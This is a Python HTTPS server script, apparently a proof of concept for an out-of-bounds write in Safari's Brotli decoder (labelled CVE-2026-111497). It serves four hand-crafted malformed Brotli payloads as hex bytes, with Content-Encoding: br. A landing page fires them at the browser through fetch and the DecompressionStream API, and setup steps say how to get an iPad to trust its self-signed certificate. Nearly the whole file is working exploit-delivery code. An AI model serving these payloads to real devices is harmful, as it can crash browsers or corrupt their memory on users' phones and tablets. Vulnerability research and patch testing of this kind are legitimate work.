#!/usr/bin/env python3
"""CVE-2026-111497 Brotli OOB Write - HTTPS Trigger Server.

HTTPS is required because Safari only sends Accept-Encoding: br over HTTPS.
Uses the self-signed cert at server.crt/server.key.

The cert must be trusted on the iPad:
  1. Navigate to https://192.168.1.155:4444/ in Safari
  2. Accept the certificate warning
  3. Go to Settings > General > About > Certificate Trust Settings
  4. Enable trust for the self-signed cert

Usage:
    python3 brotli_https_server.py [port]
"""

import http.server
import ssl
import sys
import time
import os

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 4444
CERT = os.path.join(os.path.dirname(__file__), 'server.crt')
KEY = os.path.join(os.path.dirname(__file__), 'server.key')

PAYLOADS = {
    "oob-base":     bytes.fromhex("200010414141fcffff07002228f00b60f7f41f000000"),
    "oob-extended": bytes.fromhex("200010414141fcffff07002228f00b60f7f41f00000000"),
    "oob-huffman":  bytes.fromhex("200018414141fcffff07002228f00b60f7f41f000000"),
    "oob-padding":  bytes.fromhex("200010414141fcffff0f002228f00b60f7f41f000000"),
}

LANDING = b"""\
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Brotli HTTPS Trigger</title>
<style>
*{box-sizing:border-box}
body{font-family:-apple-system,system-ui,sans-serif;padding:16px;background:#0a0a0a;color:#e0e0e0;margin:0}
h1{color:#f90;font-size:1.2em;margin:0 0 8px}
p{font-size:13px;color:#999;margin:4px 0}
.row{display:flex;flex-wrap:wrap;gap:8px;margin:12px 0}
button{background:#f90;color:#000;border:none;padding:14px 20px;border-radius:8px;font-size:15px;cursor:pointer;flex:1;min-width:140px}
button:active{background:#c70}
button.red{background:#e44}
button.blue{background:#48f}
.r{margin:6px 0;padding:8px 12px;border-radius:6px;font-family:monospace;font-size:13px}
.pending{background:#222;color:#888}
.hit{background:#2a1a1a;color:#f66;border-left:3px solid #f44}
.ok{background:#1a2a1a;color:#6f6;border-left:3px solid #4f4}
.err{background:#2a2a1a;color:#ff6;border-left:3px solid #ff4}
#log{margin-top:12px;font-family:monospace;font-size:11px;white-space:pre-wrap;max-height:200px;overflow-y:auto;background:#111;padding:8px;border-radius:6px;color:#888}
.info{background:#1a1a2a;padding:10px;border-radius:6px;margin:8px 0;font-size:12px;color:#8af}
</style>
</head>
<body>
<h1>CVE-2026-111497 Brotli OOB</h1>
<p>HTTPS server - Safari sends Accept-Encoding: br over HTTPS</p>

<div class="info">
  Protocol: <span id="proto"></span> |
  Accept-Encoding includes br: <span id="ae"></span>
</div>

<div class="row">
<button onclick="fire('oob-base')">oob-base</button>
<button onclick="fire('oob-extended')">oob-extended</button>
<button onclick="fire('oob-huffman')">oob-huffman</button>
<button onclick="fire('oob-padding')">oob-padding</button>
</div>
<div class="row">
<button class="red" onclick="fireAll()">Fire ALL</button>
<button class="blue" onclick="fireDS()">DecompressionStream</button>
</div>

<div id="results"></div>
<div id="log"></div>

<script>
document.getElementById('proto').textContent = location.protocol;
document.getElementById('ae').textContent = '(check server log)';

var R = {};
var logEl = document.getElementById('log');

function log(m) {
  logEl.textContent += new Date().toISOString().slice(11,23)+' '+m+'\\n';
  logEl.scrollTop = logEl.scrollHeight;
}

function show(n, cls, txt) {
  R[n] = {cls:cls, txt:txt};
  var h = '';
  for (var k in R) h += '<div class="r '+R[k].cls+'">'+k+': '+R[k].txt+'</div>';
  document.getElementById('results').innerHTML = h;
}

function fire(name) {
  show(name, 'pending', 'fetching...');
  log('>>> '+name);
  var t0 = performance.now();
  fetch('/br/'+name)
    .then(function(r) {
      var ms = (performance.now()-t0).toFixed(0);
      log('  HTTP '+r.status+' in '+ms+'ms, content-encoding: '+r.headers.get('content-encoding'));
      return r.arrayBuffer().then(function(buf) {
        var a = new Uint8Array(buf);
        if (a.length === 0) {
          show(name, 'err', 'Empty response ('+ms+'ms) - decoder may have crashed');
          log('  EMPTY - possible WebKit.Networking crash');
        } else {
          show(name, 'hit', a.length+'B decoded ('+ms+'ms) - decoder processed malformed stream');
          log('  Got '+a.length+' bytes, first=0x'+a[0].toString(16));
        }
      });
    })
    .catch(function(e) {
      var ms = (performance.now()-t0).toFixed(0);
      show(name, 'err', 'ERROR ('+ms+'ms): '+e.message);
      log('  CATCH: '+e.message);
    });
}

function fireAll() {
  log('=== ALL payloads ===');
  ['oob-base','oob-extended','oob-huffman','oob-padding'].forEach(function(n,i) {
    setTimeout(function(){fire(n)}, i*600);
  });
}

function fireDS() {
  log('=== DecompressionStream API ===');
  show('ds-api', 'pending', 'testing DecompressionStream...');
  if (typeof DecompressionStream === 'undefined') {
    show('ds-api', 'err', 'DecompressionStream not available');
    log('  API not available');
    return;
  }
  fetch('/raw/oob-base')
    .then(function(r) { return r.arrayBuffer(); })
    .then(function(buf) {
      log('  Got raw bytes: '+buf.byteLength);
      var ds = new DecompressionStream('br');
      var writer = ds.writable.getWriter();
      var reader = ds.readable.getReader();
      var chunks = [];
      writer.write(new Uint8Array(buf));
      writer.close();
      function pump() {
        return reader.read().then(function(result) {
          if (result.done) {
            var total = chunks.reduce(function(s,c){return s+c.length},0);
            show('ds-api', 'hit', 'Decompressed '+total+'B via JS API');
            log('  DS output: '+total+' bytes');
            return;
          }
          chunks.push(result.value);
          return pump();
        });
      }
      return pump();
    })
    .catch(function(e) {
      show('ds-api', 'err', 'DS error: '+e.message);
      log('  DS error: '+e.message);
    });
}
</script>
</body>
</html>
"""


class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/' or self.path == '/index.html':
            self.send_response(200)
            self.send_header('Content-Type', 'text/html; charset=utf-8')
            self.send_header('Content-Length', str(len(LANDING)))
            self.send_header('Cache-Control', 'no-store')
            self.end_headers()
            self.wfile.write(LANDING)
            return

        # /br/<name> — serve malformed Brotli with Content-Encoding: br
        if self.path.startswith('/br/'):
            name = self.path[4:].split('?')[0]
            if name in PAYLOADS:
                payload = PAYLOADS[name]
                ae = self.headers.get('Accept-Encoding', '')
                ts = time.strftime('%H:%M:%S')
                print(f"[{ts}] {self.client_address[0]} /br/{name} "
                      f"AE={ae} ({len(payload)}B)")
                self.send_response(200)
                self.send_header('Content-Type', 'application/octet-stream')
                self.send_header('Content-Encoding', 'br')
                self.send_header('Content-Length', str(len(payload)))
                self.send_header('Cache-Control', 'no-store')
                self.end_headers()
                self.wfile.write(payload)
                return

        # /raw/<name> — serve raw bytes WITHOUT Content-Encoding
        # (for DecompressionStream JS API testing)
        if self.path.startswith('/raw/'):
            name = self.path[5:].split('?')[0]
            if name in PAYLOADS:
                payload = PAYLOADS[name]
                self.send_response(200)
                self.send_header('Content-Type', 'application/octet-stream')
                self.send_header('Content-Length', str(len(payload)))
                self.send_header('Cache-Control', 'no-store')
                self.end_headers()
                self.wfile.write(payload)
                return

        self.send_response(404)
        self.send_header('Content-Type', 'text/plain')
        self.end_headers()
        self.wfile.write(b'not found')

    def log_message(self, fmt, *args):
        pass


def main():
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(CERT, KEY)

    server = http.server.HTTPServer(('0.0.0.0', PORT), Handler)
    server.socket = ctx.wrap_socket(server.socket, server_side=True)

    print(f"CVE-2026-111497 Brotli HTTPS Trigger")
    print(f"  https://0.0.0.0:{PORT}/")
    print(f"  Cert: {CERT}")
    print(f"  Payloads: {', '.join(PAYLOADS.keys())}")
    print(f"  /br/<name>  = Content-Encoding: br (Safari auto-decompresses)")
    print(f"  /raw/<name> = raw bytes (for DecompressionStream JS API)")
    print()
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nStopped.")


if __name__ == '__main__':
    main()
